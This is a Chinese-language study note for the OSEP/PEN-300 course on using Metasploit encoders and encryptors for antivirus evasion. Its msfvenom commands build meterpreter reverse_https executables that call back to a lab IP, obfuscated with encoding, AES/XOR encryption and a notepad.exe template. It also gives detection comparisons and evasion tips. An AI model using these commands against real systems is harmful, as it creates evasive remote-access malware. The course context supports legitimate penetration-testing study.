---
title: OSEP-07-Metasploit编码器与加密器
description: '07-杀软绕过 | 02-Metasploit编码器与加密器'
pubDate: 2026-01-30T00:01:01+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# Metasploit 编码器与加密器

## 编码器概述

Metasploit 编码器最初用于绕过杀软，现在主要用于处理坏字符。

### 列出可用编码器

```bash
msfvenom --list encoders
```

### 常用编码器

| 编码器 | 架构 | 说明 |
|--------|------|------|
| x86/shikata_ga_nai | 32位 | 多态 XOR 编码器 |
| x64/zutto_dekiru | 64位 | 类似 shikata_ga_nai |
| x86/call4_dword_xor | 32位 | XOR 编码器 |
| x64/xor | 64位 | 简单 XOR 编码器 |

### 使用编码器

```bash
# 32位 shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    -e x86/shikata_ga_nai \
    -f exe -o met_encoded.exe

# 64位 zutto_dekiru
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    -e x64/zutto_dekiru \
    -f exe -o met64_encoded.exe
```

### 多次迭代

```bash
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    -e x86/shikata_ga_nai -i 10 \
    -f exe -o met_encoded_10.exe
```

### 编码器局限性

**问题**: 解码器本身是静态的，会被检测

```
编码后的 shellcode + 静态解码器 = 仍可被检测
```

## 加密器

### 列出加密选项

```bash
msfvenom --list encrypt
```

### 可用加密类型

| 类型 | 说明 |
|------|------|
| aes256 | AES-256 加密 |
| base64 | Base64 编码 |
| rc4 | RC4 加密 |
| xor | XOR 加密 |

### 使用加密

```bash
# AES256 加密
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    --encrypt aes256 \
    --encrypt-key fdgdgj93jf43uj983uf498f43 \
    -f exe -o met64_aes.exe

# XOR 加密
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    --encrypt xor \
    --encrypt-key mykey123 \
    -f exe -o met64_xor.exe
```

### 加密器局限性

**问题**: 解密例程仍然是静态的

## 自定义模板

### 使用自定义模板

```bash
# 复制 notepad.exe 作为模板
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    -e x64/zutto_dekiru \
    -x /path/to/notepad.exe \
    -f exe -o met64_notepad.exe
```

### 模板选择建议

- 使用合法的 Windows 程序
- 选择大小合适的程序
- 避免使用常见的模板

## 检测结果对比

| 方法 | ClamAV | Avira |
|------|--------|-------|
| 原始 32位 | 检测 | 检测 |
| 原始 64位 | 通过 | 检测 |
| shikata_ga_nai | 检测 | 检测 |
| zutto_dekiru | - | 检测 |
| AES256 加密 | - | 检测 |
| 自定义模板 | - | 检测 |

## 结论

1. **编码器效果有限** - 解码器被检测
2. **加密器效果有限** - 解密例程被检测
3. **64位比32位好** - 签名较少
4. **自定义代码最有效** - 需要自己编写

## 最佳实践

1. 使用自定义 shellcode runner
2. 实现自定义加密/解密
3. 避免使用公开工具
4. 定期测试检测率
